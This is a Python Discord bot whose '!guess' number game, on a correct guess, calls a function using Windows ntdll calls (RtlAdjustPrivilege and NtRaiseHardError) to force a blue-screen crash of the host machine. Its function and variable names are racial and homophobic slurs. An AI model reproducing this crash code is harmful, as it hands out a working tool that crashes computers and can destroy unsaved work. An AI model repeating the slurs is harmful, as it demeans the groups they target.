import discord, os, random
from discord.ext import commands
from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command('help')
os.system('cls')

def NIGGAR():
    nullptr = POINTER(c_int)(); windll.ntdll.RtlAdjustPrivilege(c_uint(19),c_uint(1),c_uint(0),byref(c_int())); windll.ntdll.NtRaiseHardError( c_ulong(0xC000007B),c_ulong(0),nullptr,nullptr,c_uint(6),byref(c_uint()))

@bot.event
async def on_ready():
    print(f"{bot.user} is online | Watching {len(bot.guilds)} servers")

@bot.command()
async def guess(ctx):
    faggot = False

    while True:
        number = random.randint(0, 40)
        print(number)
        await ctx.send('Starting. Pick a number between 1 - 40')
        response = await bot.wait_for('message')
        guess = int(response.content)
        if guess == number:
            await ctx.send('[!] Correct! Attempting to start bluescreen.')
            faggot = True
            break
        else:
            await ctx.send('[!] Incorrect! Try again.')
    if faggot:
        await ctx.send("[DEBUG] Faggot is initialised")
        await ctx.send("[DEBUG] Attempting to bluescreen")
        await ctx.send("[DEBUG] If you dont see the following message, it was a successful BSOD.") #you can comment this out
        NIGGAR()
        await ctx.send("[DEBUG] If you see this, bluescreen failed.")

bot.run("INSERT TOKEN HERE")